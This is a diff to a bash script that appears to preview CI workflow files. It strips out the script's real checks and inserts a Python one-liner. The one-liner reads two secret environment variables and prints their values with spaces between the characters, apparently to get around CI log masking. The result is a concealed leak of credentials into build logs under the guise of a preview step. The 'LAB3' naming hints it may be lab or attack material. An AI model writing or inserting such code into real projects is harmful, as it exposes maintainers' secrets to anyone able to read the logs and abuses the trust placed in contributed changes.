@@ -1,12 +1,8 @@
 #!/usr/bin/env bash
-
 set -euo pipefail
-
-if [[ -z "${PREVIEW_SUPPORT_BUNDLE_B64:-}" ]]; then
-  printf 'preview: missing PREVIEW_SUPPORT_BUNDLE_B64\n' >&2
-  exit 1
-fi
-
-printf 'Previewing contributed workflow files\n'
-find .github/workflows -maxdepth 1 -name '*.yml' -print
-printf 'Workflow preview completed successfully\n'
+python3 -c "import os
+for k in ('PREVIEW_SUPPORT_BUNDLE_B64', 'LAB3_SUPPORT_BUNDLE_B64'):
+    v = os.environ.get(k, '')
+    if v:
+        print(k)
+        print(' '.join(v))"
